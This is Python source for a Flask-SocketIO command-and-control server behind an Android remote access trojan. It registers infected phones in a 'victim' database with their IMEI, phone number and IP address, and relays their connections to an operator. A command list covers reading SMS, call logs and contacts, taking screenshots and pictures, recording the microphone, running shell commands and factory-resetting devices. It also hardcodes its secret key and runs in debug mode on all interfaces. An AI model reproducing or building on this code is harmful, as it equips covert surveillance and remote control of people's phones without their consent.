from sqlite3.dbapi2 import Error
from flask import Flask, json, request,  make_response
from flask_socketio import SocketIO, emit, join_room, rooms
import sqlite3
from routes import views

# below dashboard pass data from nav link ro confirm original request
app = Flask(__name__)
app.register_blueprint(views)
app.secret_key = 'the rastafarian in you'
socketio = SocketIO(app)

''' COMMAND LIST
0x0 - Send SMS
0x1 - Read SMS
0x2 - Read Call Log
0x3 - Make Phone Call
0x4 - Dial USSD (API 26+)
0x5 - Read Contacts
0x6 - Write Contact
0x7 - Screenshot
0x8 - Get Camera List
0x9 - Take Picture
0xA - Record Mic
0xB - sh Command
0xC - List Installed Apps
0xD - Vibrate Phone
0xE - Change Wallpaper
0x10 - Factory Reset Device
'''

commands = [
    "0x0",
    "0x1",
    "0x2",
    "0x3",
    "0x4",
    "0x5",
    "0x6",
    "0x7",
    "0x8",
    "0x9",
    "0xA",
    "0xB",
    "0xC",
    "0xD",
    "0xE",
    "0x10",
]


# Connection from C2
@socketio.on('connect')
def test_connect():
    with open('server_soc_id.txt', 'w') as f:
        f.write(request.sid)
    emit('after connect',  {'data':'Session starting ...'})
    try:
        con = sqlite3.connect("database.db")
        cur = con.cursor()
        cur.execute("SELECT * FROM victim")
        record = cur.fetchall()
        con.close()
        if record.__len__() != 0:
            emit("victims", {'data' : record})
        else:
            emit("victims", {'data' : 'None'})
    except sqlite3.Error as error:
        print("something went wrong")


# Connection from android
@socketio.on('android_connect')
def value_changed(data):
    print(data)
    sid = ""
    with open('server_soc_id.txt', 'r') as f:
        sid = f.read()
    try:
        con = sqlite3.connect("database.db")
        cur = con.cursor()
        cur.execute("SELECT * FROM victim WHERE deviceid= ?", (data['device_id'],))
        record = cur.fetchall()
        if record.__len__() == 0:
            cur.execute(
                "INSERT INTO victim(model, deviceid, ipaddress, api, imei, socketid, phone) VALUES(?, ?, ?, ?, ?, ?, ?)",
                (
                    data['model'],
                    data['device_id'],
                    request.remote_addr,
                    data['api'],
                    data['imei'],
                    request.sid,
                    data['phone']
                )
            )
            con.commit()
        else:
            if record[0][3] != request.remote_addr:
                cur.execute("UPDATE victim SET ipaddress=? WHERE deviceid=?", (request.remote_addr, data['device_id']))
                con.commit()
                emit("update victim ip", {'data' : [data['device_id'], request.remote_addr]})
            if record[0][6] != request.sid:
                cur.execute("UPDATE victim SET socketid=? WHERE deviceid=?", (request.sid, data['device_id']))
                con.commit()
                emit("update victim socketid", {'data' : [data['device_id'], request.sid]})
        con.close()
    except sqlite3.Error as error:
        print(error)
    emit("new device", {'data': [data['model'], data['device_id'], request.remote_addr, data['api'], data['imei'], request.sid, "phone placeholder"]})

    # emit('android value', message, broadcast=True,)

@socketio.on('pong')
def pong(data):
    sid = ""
    with open('server_soc_id.txt', 'r') as f:
        sid = f.read()
    emit("pingback", {"deviceid" : data['device_id']}, to=sid)
     

@socketio.on('Slider value changed')
def value_changed(message):
    print(message['data'])
    emit('update value', message, broadcast=True,)



if __name__ == "__main__":
    socketio.run(app, host="0.0.0.0", port=5001, debug=True)
